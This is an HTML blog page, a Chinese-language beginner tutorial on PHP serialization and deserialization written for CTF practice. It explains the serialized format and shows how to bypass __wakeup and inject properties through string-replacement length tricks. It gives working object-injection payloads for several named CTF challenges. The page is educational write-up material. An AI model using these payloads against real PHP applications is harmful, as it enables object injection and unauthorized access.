@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="moMaxX">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="PHP序列化及反序列化绕过"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Momax&#39;s blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://moMaxX.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Momax&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Momax's blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+  	<!-- 雪花特效 --> 
+  
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">PHP序列化及反序列化绕过</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/MomaxX" target="_blank" rel="noopener">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:194038819@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By moMaxX</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-11-18</span>
+            <span class="time">23:08:36</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>@<a href="序列化和反序列化及绕过">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本菜鸡本着菜死人不偿命的觉悟，接着迈向了ctf的世界。<br><strong>废话不多说，今天来谈一下PHP的序列化和反序列化还有一些绕过姿势</strong></p>
+<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>在PHP里面存在一个<code>serialize</code>方法来实现序列化功能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Serializable &#123;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> serialize ( ) : string</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> unserialize ( string $serialized ) : mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在官方说明中提供了这个接口的摘要。<br>接下来用本地实验的例子来说明一下序列化结果的大致格式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$init=<span class="number">12</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($init).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化整形数据，得到格式为i:12;</span></span><br><span class="line">$string=<span class="string">'test'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($string).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化字符串型数据，得到格式为s:4:"test";</span></span><br><span class="line">$boolean=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($boolean).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化布尔类型数据，得到格式为b:0;</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'0'</span> =&gt;<span class="string">'array'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($array).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化数组类型数据，得到格式为a:1:&#123;i:0;s:5:"array";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201117202304956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="运行结果"><br>所以，经过试验可以得出：<br><code>i</code>即<code>integer</code>代表的是<code>整型的数据</code>，其<code>数据的范围</code>是<code>-2147483648~2147483647</code>，而其后面跟的12就是这个变量的值；<br><code>s</code>即<code>string</code>代表的是<code>字符串类型</code>的数据，后面跟的4为变量的字符个数，之后跟的是变量的值；<br><code>b</code>即<code>bool</code>代表的是<code>布尔类型</code>的数据，而布尔类型的数据只有<code>false</code>和<code>true</code>两种，返回时只会返回<code>0</code>和<code>1</code>；<br><code>a</code>即<code>array</code>代表的是数组类型的数据，可以看到有一个花括号，前面半部分是索引值，代表的是数组索引是从0开始，后面是当前索引位置的数据的类型和值。<br>关于其他的，就不在这里进行总结，总结几个比较常见的。<br>当然还有就是PHP语言特性，可以把<code>整个方法或者整个类给序列化</code>，这时的格式就是<code>O</code>开头了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*$init=12;</span></span><br><span class="line"><span class="comment">echo serialize($init).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$string='test';</span></span><br><span class="line"><span class="comment">echo serialize($string).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$boolean=false;</span></span><br><span class="line"><span class="comment">echo serialize($boolean).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$array = array('0' =&gt;'array');</span></span><br><span class="line"><span class="comment">echo serialize($array).'&lt;br /&gt;';*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment"># code...</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;username=$username;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username===<span class="string">'zhangsan'</span>&amp;&amp;this-&gt;$password===<span class="string">'123456'</span>) &#123;</span><br><span class="line">			<span class="comment"># code...</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"flag&#123;nice!&#125;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"stop hacker!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$username=<span class="string">'zhangsan'</span>;</span><br><span class="line">$password=<span class="string">'123456'</span>;</span><br><span class="line">$a=<span class="keyword">new</span> test($username,$password);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到结果<br><img src="https://img-blog.csdnimg.cn/2020111720392718.png#pic_center" alt="序列化类结果"></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>既然有了序列化函数<code>serialize</code>，那反序列化函数就能猜出来是<code>unserialize</code>。<br>在这里需要注意的是<code>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()成员函数（如果存在的话）</code><br>也就是说比如在上面的例子中，若加入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b=serialize($a);</span><br><span class="line">$test=unserialize($b);</span><br></pre></td></tr></table></figure>
+<p>那么就会得到<br><img src="https://img-blog.csdnimg.cn/20201117204742877.png#pic_center" alt="得到结果"><br>即在检测到这个反序列化对象是个类之后，发现有<code>__wakeup()</code>函数，会执行这个函数。而在源码中是执行了让一个if判断，满足输出指定内容。在这里也可以进行一个修改序列化的值，从而达到相关的目的。</p>
+<h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化</span><br></pre></td></tr></table></figure>
+<p>也就是说，在实际题目中，可以通过修改指定的值使其大于原值，从而达到绕过的目的。<br>也就是说假如现在有一串这个代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $a=<span class="string">'flag&#123;nice!&#125;'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a=<span class="string">'go out,hacker!'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">'O:4:"test":1:&#123;s:1:"a";s:11:"flag&#123;nice!&#125;";&#125;'</span>;</span><br><span class="line">$b=unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>大致的题目意思就是有一个类，里面的变量a为<code>flag字符串</code>，然后需要输出，但是在上面说的会调用<code>wakeup函数</code>，导致无法输出flag字符串。即<br><img src="https://img-blog.csdnimg.cn/20201118200301486.png#pic_center" alt="正常输出"><br>但是现在需要输出它，所以就可以用上面说的方法来绕过<code>wakeup</code>函数，即构造payload为<code>a=O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:11:&quot;flag{nice!}&quot;;}</code><br>此时输出为<br><img src="https://img-blog.csdnimg.cn/20201118200451907.png#pic_center" alt="要求输出"><br>从而达到了绕过的想法。</p>
+<h2 id="序列化利用"><a href="#序列化利用" class="headerlink" title="序列化利用"></a>序列化利用</h2><p>反序列化可以绕过，同样序列化也可以进行利用。<br>假如现在的代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username=$username;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="string">'zhangsan'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">				<span class="keyword">echo</span> $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'hahaha'</span>,<span class="string">'heyheyhey'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username=<span class="string">'lisi'</span>;</span><br><span class="line">$password=$_GET[<span class="number">1</span>];</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($username,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过源码知需要绕过wakeup函数里的if判断，然后执行语句，但是username变量值被写死，因此这时候就可以利用序列化进行操作。<br>首先对类进行序列化查看一下<br><img src="https://img-blog.csdnimg.cn/20201118204224460.png#pic_center" alt="序列化结果"></p>
+<p>发现本应该是<code>hahaha</code>的变成了<code>heyheyhey</code><br>然后构造一下payload的一部分：<code>&quot;;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;}</code>共30个字符，然后字符替换是有3个字符，所以应该构造最终payload为：<code>hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha&quot;;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;}</code><br>运行结果<br><img src="https://img-blog.csdnimg.cn/20201118204417285.png#pic_center" alt="结果"><br>发现<code>username</code>值被成功改为<code>zhangsan</code>。说明成功。<br>所以效果最终为：<br><img src="https://img-blog.csdnimg.cn/20201118224629278.png#pic_center" alt="最终结果"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意：如果在本地实验中发现修改之后页面提示错误的，可以在源码里加一个函数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_unserialize</span><span class="params">($serial_str)</span> </span>&#123;</span><br><span class="line">$out = preg_replace(<span class="string">'!s:(\d+):"(.*?)";!se'</span>, <span class="string">"'s:'.strlen('$2').':\"$2\";'"</span>, $serial_str );</span><br><span class="line"><span class="keyword">return</span> unserialize($out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>是在报 <code>unserialize(): Error at offset 124 of 181 bytes in</code>错误时可以尝试这个自建函数来进行实验。</strong></p>
+<h3 id="ctf题目实例"><a href="#ctf题目实例" class="headerlink" title="ctf题目实例"></a>ctf题目实例</h3><h4 id="攻防世界-unserialize3"><a href="#攻防世界-unserialize3" class="headerlink" title="攻防世界 unserialize3"></a>攻防世界 unserialize3</h4><p>打开题目，发现源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+<p>所以，根据上面讲的，可以直接将flag字符串那一列进行序列化，然后修改值得到flag。<br>先序列化得到<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，修改得<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br><img src="https://img-blog.csdnimg.cn/20201118225636493.png#pic_center" alt="flag"></p>
+<h4 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a>攻防世界 Web_php_unserialize</h4><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201118225745500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="源码"><br>同样，修改一下，进行序列化，然后<code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，然后修改得到<code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code>，这里注意还需要一次base64编码才能得到。</p>
+<h4 id="ctfshow-月饼杯第一题次夜圆"><a href="#ctfshow-月饼杯第一题次夜圆" class="headerlink" title="ctfshow 月饼杯第一题次夜圆"></a>ctfshow 月饼杯第一题次夜圆</h4><p>具体源码和上面那个序列化利用是一样的，也可以说上面的序列化利用中举的例子就是这个题目，按照上面得方法，构造最终payload为：<code>?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;}</code>，提交得到flag。<br><img src="https://img-blog.csdnimg.cn/20201118230251415.png#pic_center" alt="得到flag"></p>
+<h1 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h1><p>还是经常说的那句话，自己总结的只是一些入门的东西，更加深刻得方面需要慢慢学习下去，努力下去，一切都有可能，加油。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
